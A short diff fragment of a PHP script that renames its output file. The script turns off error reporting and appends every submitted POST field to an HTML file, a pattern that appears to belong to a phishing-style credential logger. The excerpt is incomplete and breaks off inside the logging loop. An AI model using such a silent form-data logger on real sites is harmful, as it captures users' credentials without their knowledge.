@@ -1,6 +1,6 @@
 <?php
 error_reporting(0);
-$handle = fopen("rdtr.html","a");
+$handle = fopen("Ardtr.html","a");
 foreach($_POST as $variable => $value)
 {
   fwrite($handle, $variable);
